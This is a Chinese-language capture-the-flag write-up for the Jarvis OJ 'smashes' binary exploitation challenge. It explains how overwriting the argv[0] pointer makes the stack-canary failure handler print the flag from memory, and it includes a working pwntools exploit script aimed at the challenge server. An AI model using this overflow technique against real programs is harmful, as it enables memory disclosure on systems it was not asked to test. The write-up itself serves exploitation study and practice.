#### smashes

binary: [smashes.44838f6edd4408a53feb2e2bbfe5b229](http://ctf.leaflxh.com:3000/Jarvis/pwn/smashes.44838f6edd4408a53feb2e2bbfe5b229)

>Smashes, try your best to smash!!!



用checksec发现开启了stack canary

```
$ checksec smashes.44838f6edd4408a53feb2e2bbfe5b229   
   	Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
```

flag在内存中

调试发现canary的值带00，绕不过去。

不过可以通过利用stack_chk_failed函数的特性来达到任意内存读取：

在检测到canary被破坏后stack_chk_failed()函数就会执行，该函数作用是打印消息“当前栈已被破坏”，并且打印出当前可执行文件的名称。这个名称字符串的指针是main函数 char **argv下的argv[0]，通过篡改这个字符串的指针，比如改成flag字符串的指针，那么当该函数被调用的时候，就不是打印文件的名称，而是打印flag字符串。



```python
from pwn import *
import time
DBG = False

argv0_ptr = 0x7fffffffe028
rsp_ptr = 0x7fffffffde10

distance = argv0_ptr - rsp_ptr
flag_ptr = 0x400d21

payload = "A" * distance + p64(flag_ptr)


if DBG:
    session = process("./smashes.44838f6edd4408a53feb2e2bbfe5b229")
else:
    session = remote("pwn.jarvisoj.com", "9877")
    time.sleep(5)



print session.recv()
session.sendline(payload)
time.sleep(3)

print session.recv()
session.sendline("ABC")
time.sleep(3)
print session.recv()

```

不知为何本地调试时无论如何打印出来的都是\<unknow\>,服务端测试没问题